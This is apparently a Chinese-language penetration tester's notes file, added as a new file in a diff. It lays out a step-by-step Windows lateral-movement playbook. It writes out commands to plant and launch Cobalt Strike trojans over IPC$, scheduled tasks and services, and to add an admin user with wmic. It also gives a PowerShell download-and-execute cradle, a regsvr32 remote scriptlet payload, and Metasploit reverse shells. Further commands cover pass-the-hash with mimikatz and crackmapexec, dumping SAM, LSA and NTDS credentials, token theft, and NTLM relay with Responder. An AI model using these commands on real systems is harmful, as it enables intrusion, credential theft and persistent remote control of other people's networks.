@@ -1,0 +1,554 @@
+横向移动手法：
+(1).账户密码连接。
+1. IPC$连接：共享"命名管道"的资源。 文件或文件夹共享。
+利用IPC$连接能实现远程登录或获取目标主机上的共享数据。
+
+利用条件：
+a1：139、445端口开放，防火墙允许。
+a2：开启默认共享(C$、D$、E$、F$、admin$)
+a3：有本地或域管的账号密码(IPC$空连接除外)
+
+
+IPC$连接常见错误：
+b1.错误号5       拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；
+b2.错误号51       Windows 无法找到网络路径 : 网络有问题；
+b3.错误号53       找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；
+b4.错误号67       找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$；
+b5.错误号1219     提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。
+b6.错误号1326     未知的用户名或错误密码 ： 原因很明显了；
+b7.错误号1792     试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况）
+b8.错误号2242     此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。
+
+
+
+
+查看本机共享：
+net share
+
+连接域机器：
+net use \\server\ipc$ "passwd" /user:domain\username
+如：
+net user \\192.168.43.6\IPC$ "Qwetestz" /user:god\administrator
+net user
+连接工作组：
+net use \\server\ipc$ "passwd" /user:username
+如：
+net user \\192.168.43.6\C$ "Qwetestz" /user:administrator
+
+
+
+
+场景1：通过计划任务上传cs木马执行上线：
+上传木马：
+copy doozr.exe \\192.168.88.134\c$\wknz.exe
+
+
+注：copy指令不能复制文件夹，xcopy可以。
+如：
+xcopy doozr.exe \\192.168.88.134\admin$\temp\wknz.exe
+
+
+
+查看对应目标机器上的当前时间(需先成功建立IPC$连接)：
+net time "\\192.168.88.134"
+
+
+
+使用schtasks命令：os>=winserver2008或os>win7
+创建计划任务：
+schtasks /create /TN cs /TR C:\wknz.exe /SC once /ST 19:35
+
+查看名为cs的计划任务
+schtasks /query /TN cs
+
+常用指令：
+/F      强制创建，覆盖已有任务
+/TN     任务名
+/ST     指定运行时间
+/s      指定远程连接的计算机
+/U      用户名
+/P      密码
+
+
+创建计划任务：
+eg1：
+schtasks /create /s "192.168.88.134" /u "administrator" /p "Qwetest1" /tn "renwuzname" /tr "c:/sbpwqz.exe"  /sc once /st 08:16
+eg2：以system权限运行。
+schtasks /create /s "192.168.88.134" /u "administrator" /p "Qwetest1" /tn "renwuzqwqwqqwename" /tr "c:/sbpwqz.exe"  /sc once /ru "system"  /st 08:28
+
+上线成功。
+
+查看名为renwuzname的计划任务：在目标机器上执行。
+schtasks /query /TN "renwuzname"
+
+
+
+成功获取session.
+
+
+更改字符集：
+chcp 437
+
+
+
+断开ipc$连接：
+net user \\192.168.88.134 /del /y
+
+建立IPC$空连接：即不需账户密码。 IPC$空连接一般能查看有哪些用户，其他就没啥用。
+net use \\192.168.88.134\IPC$ "" /user:""
+
+
+
+win7执行计划任务。
+at \\192.168.43.33 10:03:08 c:\windows\temp\zbeacon.exe
+低版本系统(win7等)执行at可能会有问题。
+
+连接工作组机器：其中DESKTOP-A8E8C5V为机器名。
+net use \\192.168.52.201 /user:DESKTOP-A8E8C5V\administrator "Qwetest1"
+
+
+清除at记录：
+at \\192.168.43.6 /delete /yes
+
+
+at \\192.168.43.6 10:03:08 cmd.exe /C "ipconfig" > C:/"qwz.txt"
+或：
+cmd.exe /c ipconfig > c:/qwpz.txt
+
+查看文件：
+type "\\192.168.52.201\c$\qwpz.txt"
+
+
+
+
+
+
+
+
+
+
+
+
+
+利用sc命令(该命令可以注册、删除、查询系统服务)方式上线：一般使用cs生成服务马。
+c1：建立IPC$连接：
+net use \\192.168.43.6\ipc$ /user:administrator "passwdz"
+c2：上传文件：
+copy C:\Users\shiyan1\z10con.exe \\192.168.43.39\c$\windows\temp\test10.exe
+
+c3：配置服务且启动该服务：
+sc \\192.168.43.39 create "sbxcs10" binpath="cmd /c c:\windows\temp\test10.exe"
+sc \\192.168.43.39 start "sbxcs10"      //启动服务
+上线成功。
+
+sc \\192.168.43.39 delete "sbxcs10"         //删除服务
+删除后不重启一般session能继续使用。
+
+
+
+
+
+
+REG ADD \\192.168.43.6\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BGsbxzClient /t REG_SZ /d C:\WINDOWS\system32\BGC.exe /F
+或将192.168.43.6换为远程机器名。
+说明：
+/v  要添加的键名
+/t  数据类型
+/d  即对应的键名数据(值)
+/f  不提示且强行修改注册表项
+
+此法自己尝试失败。
+
+
+
+
+
+
+
+wmic：一个系统插件，方便对windows主机进行各种日常管理。
+win中默认不会在日志中记录这些操作。
+
+使用：
+1.需目标系统启动Windows Management Instrumentation服务(默认开启)，且放开135端口。
+2.目标系统的本地安全策略的"网络访问：本地账户的共享和安全模式"应设为"经典-本地用户以自己的身份验证"
+3.wmic会以管理员权限执行命令。
+4.若报错"Invalid Global Switch"，则使用双引号将包含有-的节点括起来即可。
+
+
+
+
+
+在远程目标系统上执行bat脚本：
+wmic /node:192.168.52.138/user:administrator /password:Liufupeng123z process call create c:\twwz\tesz.bat
+
+执行单条指令：
+wmic /node:192.168.52.138 /user:administrator /password:Liufupeng123 process call create "cmd.exe /c ipconfig > c:\result.txt"
+
+wmic /node:192.168.52.138 /user:administrator /password:Liufupeng123 process call create "cmd.exe /c net user qtest passwdqz /add && net localgroup administrators qtest /add"
+
+
+wmic /node:192.168.52.138/user:administrator /password:Liufupeng123z process call create "cmd.exe /c kqwz.exe"
+
+
+
+
+web方式上线：
+设置listener为跳板机的中转listener. 在跳板机上搭建web服务，放入代码文件，使目标能访问到。
+如：
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.43.6:80/fdge.txt'))"
+成功上线。
+
+
+
+
+wmiexec半交互shell：
+https://github.com/OneScripter/WmiExec
+
+
+
+
+
+
+绕过杀软(无需445端口)：命令执行、上传下载。
+https://github.com/rootclay/WMIHACKER
+有命令回显执行方式
+cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1
+
+无命令回显
+cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0
+
+模拟shell模式
+工作组模式：
+cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"
+域模式：
+cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 god\administrator "Password!"
+
+
+
+
+
+
+
+
+
+
+
+使用impackets wmiexec执行命令，能回显，常用于linux访问win时。
+https://github.com/SecureAuthCorp/impacket/
+
+
+windows版本：
+https://github.com/maaaaz/impacket-examples-windows/releases/tag/v0.9.17
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip install -r requirements.txt
+cd examples
+python wmiexec.py -hashes
+
+
+
+
+
+
+
+msf wmi：自己尝试失败。
+msf6> use exploit/windows/local/wmi
+
+设置监听在kali：
+msf6> set lport 5631
+msf6 exploit(windows/local/wmi) > set lhost 192.168.43.141
+
+msf6> set session 1
+msf6> set smbuser administrator
+
+msf6> set smbpass Qwetest1
+msf6> set payload windows/meterpreter/reverse_tcp_uuid
+msf6> set rhosts 192.168.52.201
+msf6> run -j
+
+若出现长度错误，则执行：
+msf6> set Powershell::prepend_protections_bypass false
+
+
+
+
+
+
+psexec：一种轻量型telnet替代品。
+利用条件：
+1.目标开启ADMIN$共享。
+2.目标开启并放行445端口。
+
+
+不足：
+使用psexec建立连接后，目标系统会被安装一个服务：PSEXEC 会留下日志。 删除服务也可能失败。
+
+使用：独立的psexec.exe文件。
+psexec \\192.168.43.39 -u god\administrator -p Qwe123456 cmd    //返回cmd终端
+
+
+psexec \\192.168.43.39 -u god\administrator -p Qwe123456 -s cmd /s "whoami"     //打开目标主机的cmd终端
+
+执行命令：
+psexec \\192.168.43.39 -u god\administrator -p Qwe123456 -s cmd /c "whoami"
+
+启动程序：
+psexec \\192.168.43.39 -u god\administrator -p Qwe123456 -s cmd /c c:\wdz\pqz.exe
+
+
+
+
+
+
+
+
+
+msf psexec PTH模块：哈希传递。
+msf>use exploit/windows/smb/psexec
+msf>set rohost 192.168.43.6
+msf>set smbuser usernamze
+msf>set smbdomain god
+msf>setpass 00000000000000000000000000000000:kw84kw73k5ie73jrkjekdjzahwqzjshw
+msf>run
+其中32个0起lm hash占位作用。
+
+或执行命令：
+msf>set command whoami
+msf>run
+
+
+
+
+
+
+scshell：无文件横向移动工具。依赖ChangeServiceConfigA来运行命令。 不会针对smb执行身份验证，全通过DCERPC执行，无需创建服务，只需通过ChangeServiceConfigAAPI远程打开服务并修改二进制路径名即可。
+
+https://github.com/Mr-Un1k0d3r/SCShell
+
+利用条件：
+需先知道目标系统未启动的服务。
+
+win Usage:
+SCShell.exe target service payload domain username password
+如：
+SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
+
+linux usage：
+python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2.PTH：哈希传递。 常适用于拿到hash却没法解密的情形。
+windows挑战\响应(NTLM)是一种用于网络的身份验证协议。
+仅对比密码散列值是否相同。
+
+即使打了kb2861996补丁，默认的Administrator(SID 500)账户仍可使用此法。
+
+
+
+msf模块哈希传递攻击：
+msf> use auxiliary/scanner/smb/smb_login
+msf> set rhosts 192.168.43.39
+msf> set user_file /root/Desktop/testw9/userz.txt
+msf> set pass_file /root/Desktop/testw9/passz.txt
+msf> set smbdomain god
+msf> run
+
+LM HASH的32个0起占位作用。
+高版本系统已抛弃LM HASH.
+
+
+
+
+
+crackmapexec：后渗透工具。能评估网络安全。 强推。
+apt install crackmapexec
+https://github.com/byt3bl33d3r/CrackMapExec
+
+
+常用命令：
+crackmapexec smb 192.168.215.104/24     //枚举存活ip信息
+
+
+枚举用户信息，尝试smb登录：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --users
+
+枚举用户组信息：
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASwdzS' --groups
+
+列出C$下所有的txt文件：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --spider C$ --pattern txt
+
+爆破口令：
+crackmapexec smb 192.168.215.104 -u /root/userz.txt -p /root/passz.txt
+
+SAM凭证：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --sam
+LSA凭证：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --lsa
+NTDS凭证：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --ntds drsuapi
+
+枚举NTDS凭证(通过vss卷影技术)：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' -ntds vss
+
+
+查看共享：
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --shares
+
+
+
+
+密码喷射：
+crackmapexec smb 192.168.43.39 -u /root/userz.txt -p 'Qwe123456' --rid-brute
+crackmapexec smb 192.168.43.39 -u 'Administrator' -p 'Qwe123456' --continue-on-success
+
+hash传递远程命令执行： -H指NT hash
+crackmapexec smb 192.168.43.39 -u 'Administrator' -H kwmqkzjfgeawzwdmwlertkdksjdmzqqz -x whoami
+
+
+
+
+
+kali自带PTH攻击工具：
+pth-winexe -U administrator%00000000000000000000000000000000:kwmqkzjfgeawzwdmwlertkdksjdmzqqz //192.168.43.39 cmd.exe
+
+
+
+
+
+mimikatz进行hash传递：
+1.获取hash：
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> resulz.txt
+2.hash传递：
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:god.org /ntlm:kwmqkzjfgeawzwdmwlertkdksjdmzqqz" 
+
+
+
+
+
+cs PTH：
+beacon> getuid
+beacon> powershell-import C:\Users\z\Documents\Get-PzassHashes.ps1
+beacon> powershell Get-PassHashes
+
+
+https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
+
+
+
+使用hash创建访问令牌(如：Z)，再用该令牌随便起个进程(默认cmd.exe，此处指定为powershell.exe)。
+mimikatz.exe sekurlsa::pth /user:Administrator /domain:.  /ntlm:kwmqkzjfgeawzwdmwlertkdksjdmzqqz"  /run:"powershell -w hidden"
+
+steal_token：
+窃取前面所起的进程中的访问令牌Z去访问目标资源。
+beacon> steal token 638
+beacon> shell dir \\192.168.43.6\c$
+beacon> rev2self    //恢复原始令牌
+
+
+
+
+
+
+
+
+
+
+3.WINRM：微软远程管理。是WS-Management协议的实现组件。通信通过HTTP(5985)或HTTPS SOAP(5986)执行，支持Kerberos验证、NTLM身份验证、基本身份验证。使用此服务至少需有管理员的凭据。
+
+winrm服务在win-os>=win server 2008以上自启动。
+默认下，未配置WinRM监听器。 即使winrm服务正在运行，也无法收发对应数据，需手动配置。
+使用winrm提供的winrm quickconfig对winrm进行配置后，winrm将开启监听并打开http和https监听端口，且还需允许这两个端口通过防火墙。
+
+
+步骤：
+winrm服务端配置：
+a1：进行默认配置，运行：至少需管理员权限。
+winrm quickconfig
+a2：查看配置信息：
+winrm enumerate winrm/config/listener
+a3：开启白名单，允许被其他机器远程访问： 
+winrm set winrm/config/client @{TrustedHosts="*"}
+
+winrm客户端配置并利用(反弹shell)：
+a4：设置信任列表：需powershell运行。
+Set-Item WSMan:localhost\client\trustedhosts -value *
+a5：重启winrm使其配置生效：Restart-Service WinRM
+
+a6：
+Enter-PSSession -ComputerName 192.168.52.143 -Credential administrator 输入密码获取目标shell
+
+
+灵活变换：
+域则如：god\administrator 
+
+
+注：一般需和目标机器处于同一个域中(至少能访问到)，且至少需管理员权限才能运行。
+
+
+
+
+winrm客户端利用之方式2：命令执行：
+winrs -r:http://192.168.52.143:5985 -u:god\administrator -p:Qwe123456 "whoami"
+
+若powershell客户端出问题则尝试cmd。 灵活些。
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+4.利用常规web渗透横向
+
+5.NTLM-Relay：中间人攻击。
+攻击者伪造服务诱导客户端访问，若其访问，则可窃取其凭证进行重放。
+方式1：LLMNR：基于dns数据包格式的协议，ip4、ip6通过此协议对同一本地链路上的主机执行名称解析。
+
+方式2：WPAD：网络代理自动发现协议(即自动选择代理并配置)。 是一种客户端使用DHCP或DNS来定位一个配置url的方法。
+在检测和下载配置文件后，它可以执行配置文件以测定特定url应使用的代理。
+伪造服务端，它自动去检测、访问代理，若代理需凭证，则可获取到该凭证。
+
+
+responder：
+https://github.com/SpiderLabs/Responder
+https://github.com/lgandx/Responder
+
+
+步骤：
+1.攻击机开启监听：
+python Responder.py -I eth0 -v -F
+2.受害者访问攻击机：  http://192.168.43.141
+
+
+
+
+
+
+6.钓鱼:
+cs钓鱼、邮箱钓鱼等。
